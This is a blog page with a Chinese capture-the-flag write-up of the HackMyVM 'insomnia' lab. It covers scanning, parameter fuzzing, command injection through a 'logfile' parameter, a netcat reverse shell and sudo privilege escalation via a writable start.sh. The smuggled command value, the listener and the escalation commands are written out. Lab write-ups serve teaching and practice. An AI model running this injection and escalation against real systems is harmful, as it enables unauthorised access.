@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-insomnia靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-insomnia">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/50600.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-insomnia靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1d5e6d0e0a243d4ffda75.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1d69ed0e0a243d4ffda8a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1daf2d0e0a243d4ffdc0f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1dc7fd0e0a243d4ffdc4c.png">
+<meta property="article:published_time" content="2025-02-16T12:09:29.000Z">
+<meta property="article:modified_time" content="2025-02-16T13:12:33.589Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67b1d5e6d0e0a243d4ffda75.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/50600.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-insomnia | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/50600.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-insomnia
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-16 20:09:29 / 修改时间：21:12:33" itemprop="dateCreated datePublished" datetime="2025-02-16T20:09:29+08:00">2025-02-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67b1d5c9d0e0a243d4ffda72.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-insomnia靶机复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67b1d5e6d0e0a243d4ffda75.png"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">nmap</span> -A <span class="number">192.168</span>.<span class="number">112.252</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">02</span>-<span class="number">16</span> <span class="number">20</span>:<span class="number">12</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">112.252</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0014</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">8080</span>/tcp <span class="keyword">open</span>  http    PHP cli server <span class="number">5.5</span> <span class="built_in">or</span> <span class="keyword">later</span> (PHP <span class="number">7.3</span>.<span class="number">19</span>-<span class="number">1</span>)</span><br><span class="line">|_http-<span class="keyword">open</span>-proxy: Proxy might <span class="keyword">be</span> redirecting requests</span><br><span class="line">|_http-title: Chat</span><br><span class="line">MAC Address: D2:<span class="number">24</span>:EE:B5:C6:<span class="number">9</span>D (Unknown)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|router</span><br><span class="line">Running: Linux <span class="number">4</span>.<span class="keyword">X</span>|<span class="number">5</span>.<span class="keyword">X</span>, MikroTik RouterOS <span class="number">7</span>.<span class="keyword">X</span></span><br><span class="line">OS CPE: cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:4</span> cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:5</span> cpe:/<span class="keyword">o</span>:mikrotik:routero<span class="variable">s:7</span> cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:5</span>.<span class="number">6.3</span></span><br><span class="line">OS details: Linux <span class="number">4.15</span> - <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> - <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.36</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.252</span>)</span><br><span class="line"></span><br><span class="line">OS <span class="built_in">and</span> Service detection performed. Please report any incorrect results at https://<span class="keyword">nmap</span>.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">8.19</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>只开放8080端口是一个http服务，去web上面看看</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>给了一个输入框<br><img src="https://pic1.imgdb.cn/item/67b1d69ed0e0a243d4ffda8a.png"><br>然后目录扫描一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.112.252:8080 -e php,jpg,html,js,txt,bak -i 200,300-399</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, jpg, html, js, txt, bak | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span></span><br><span class="line">Wordlist <span class="params">size:</span> <span class="number">11988</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.112.252_8080/_25-02-16_20-21-37.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">112.252</span>:<span class="number">8080</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">37</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">48</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">65</span>B  <span class="operator">-</span> <span class="symbol">/administration.php</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">53</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">2</span>KB <span class="operator">-</span> <span class="symbol">/chat.js</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">53</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">3</span>B  <span class="operator">-</span> <span class="symbol">/chat.txt</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">22</span>:<span class="number">13</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">20</span>B  <span class="operator">-</span> <span class="symbol">/start.sh</span></span><br><span class="line"></span><br><span class="line">Task Completed</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080//administration.php</span></span></span><br><span class="line">You are <span class="keyword">not</span> allowed to <span class="built_in">view</span> : &lt;br&gt;Your activity has been logged</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080/start.sh</span></span></span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br><span class="line">                                                                           </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080/chat.txt   </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                      </span><br></pre></td></tr></table></figure></div>
+<p>没有什么多余信息了，然后的思路是对这个administration.php进行参数爆破，因为这个是个php文件，可能存在后门</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 192.168.112.252:8080//administration.php?FUZZ=id --hh 65</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.112.252:8080//administration.php?FUZZ=id</span><br><span class="line">Total requests: 4744</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload   </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000002522:   200        2 L      12 W       67 Ch       &quot;logfile&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>找到参数<code>logfile</code>   去网站里面试试<br><img src="https://pic1.imgdb.cn/item/67b1daf2d0e0a243d4ffdc0f.png"><br>发现没有回显，用ping本机，然后用tcpdump看看验证是否可以成功执行命令</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?logfile=id<span class="comment">;ping -c2 192.168.112.11</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# tcpdump  -A -n icmp</span><br><span class="line">tcpdump: verbose output suppressed, <span class="keyword">use</span> -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length <span class="number">262144</span> bytes</span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">03.429775</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span>: ICMP echo request, id <span class="number">6058</span>, seq <span class="number">15</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..T</span>..@.@..<span class="number">9.</span>.p.<span class="built_in">..p</span>.........<span class="comment">;..g............................ !&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">03.429824</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span>: ICMP echo reply, id <span class="number">6058</span>, seq <span class="number">15</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..To</span>^..@...<span class="built_in">..p</span>.<span class="built_in">..p</span>.........<span class="comment">;..g............................ !&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">04.437600</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span>: ICMP echo request, id <span class="number">6058</span>, seq <span class="number">16</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..T</span>..@.@<span class="built_in">..b</span><span class="built_in">..p</span>.<span class="built_in">..p</span>.........&lt;<span class="built_in">..g</span>............................ !<span class="string">&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br></pre></td></tr></table></figure></div>
+<p>反弹shell<br><img src="https://pic1.imgdb.cn/item/67b1dc7fd0e0a243d4ffdc4c.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234          </span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)<span class="built_in"></span></span><br><span class="line"><span class="built_in">script </span>-qc /bin/bash /dev/<span class="literal">null</span></span><br><span class="line">www-data@insomnia:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat bbb                                  </span><br><span class="line">stty<span class="built_in"> raw </span>-echo; fg</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# stty<span class="built_in"> raw </span>-echo; fg</span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal<span class="built_in"> type </span>unknown</span><br><span class="line">Terminal type? xterm</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@insomnia</span><span class="symbol">:~/html</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">insomnia:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">insomnia:</span></span><br><span class="line">    (julia) <span class="symbol">NOPASSWD:</span> /bin/bash /var/www/html/start.sh</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@insomnia</span><span class="symbol">:~/html</span><span class="variable">$ </span>cat /var/www/html/start.sh</span><br><span class="line">php -S <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">8080</span></span><br></pre></td></tr></table></figure></div>
+<p>这个start.sh竟然有写入权限，这个是个sh脚本，那我们直接在脚本里面写&#x2F;bin&#x2F;bash </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-data@insomnia:~/html$ ls -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>www-data www-data<span class="number"> 4096 </span>Feb<span class="number"> 16 </span>07:14 .</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root     root    <span class="number"> 4096 </span>Dec<span class="number"> 17 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data <span class="number"> 426 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>administration.php</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1610 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>chat.js</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 4096 </span>Feb<span class="number"> 16 </span>07:39 chat.txt</span><br><span class="line">drwxr-xr-x<span class="number"> 2 </span>www-data www-data<span class="number"> 4096 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>images</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 2899 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>index.php</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1684 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>process.php</span><br><span class="line">-rwxrwxrwx<span class="number"> 1 </span>root     root      <span class="number"> 20 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>start.sh</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1363 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>style.css</span><br><span class="line"></span><br><span class="line">www-data@insomnia:~/html$ echo &quot;/bin/bash&quot; &gt;&gt; /var/www/html/start.sh</span><br><span class="line"></span><br><span class="line">www-data@insomnia:~/html$ sudo -u julia /bin/bash /var/www/html/start.sh</span><br><span class="line">[Sun Feb<span class="number"> 16 </span>07:57:36 2025] Failed to listen on 0.0.0.0:8080 (reason: Address already in use)</span><br><span class="line">julia@insomnia:/var/www/html$ id</span><br><span class="line">uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br></pre></td></tr></table></figure></div>
